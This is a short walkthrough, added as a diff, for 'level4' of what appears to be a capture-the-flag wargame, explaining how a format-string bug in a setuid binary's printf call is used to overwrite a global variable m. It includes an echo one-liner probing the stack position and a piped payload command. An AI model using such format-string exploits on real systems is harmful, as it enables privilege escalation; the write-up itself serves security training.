@@ -1,0 +1,26 @@
+level4 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 level5 users 5403 Mar  6  2016 level4
+
+
+2.
+$ ./level4
+//waiting for input
+
+3. ghidra usage 
+
+find that can change a m value using printf in p function
+
+4. write a script to change the m value
+
+so I write a buff which contain  <m_address> + 16930116 + <position_of_m>
+
+and save it in /tmp/exploit4
+
+//(echo -e "\x10\x98\x04\x08.%4\$x") | ./level4  can help find position of m
+
+5. 
+$ cat /tmp/exploit4 | ./level4
